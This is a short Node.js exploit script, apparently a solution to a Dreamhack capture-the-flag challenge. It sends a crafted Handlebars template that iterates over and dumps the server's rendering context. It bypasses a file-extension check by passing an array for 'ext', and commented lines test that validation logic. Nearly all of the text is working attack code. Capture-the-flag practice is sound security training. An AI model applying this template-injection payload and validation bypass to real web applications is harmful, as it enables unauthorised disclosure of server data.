const request = require('request');

let data = "{{#each this}} {{@index}} {{@key}} "

for(let i = 0; i < 60; i++){
    data +=  "{{lookup this "+i+"}} " 
}
data += "{{/each}}"

request.post({
    headers: { 'content-type': 'application/json' },
    url: 'http://host3.dreamhack.games:9729/a04d13cb65aaea1c0a63a9ae0b8f2eb7690e1f74e7631fbb2014732ed9d7a111',
    body: JSON.stringify({"ext":[".ejs","","",".hbs"], "filename":"exploit","contents":data})
}, function (error, response, body) {
    console.log(body);
});


// saveOptions = {ext:[".ejs","sdf","sdf","dsf"], contents:"asdf"+""}

// console.log(saveOptions.ext.includes('.ejs'))
// console.log(saveOptions.ext.length)

// console.log("a"+saveOptions.ext)

// console.log(saveOptions.contents)
// console.log(typeof saveOptions.contents !== 'string')

// !saveOptions.ext.includes('.ejs') || saveOptions.ext.length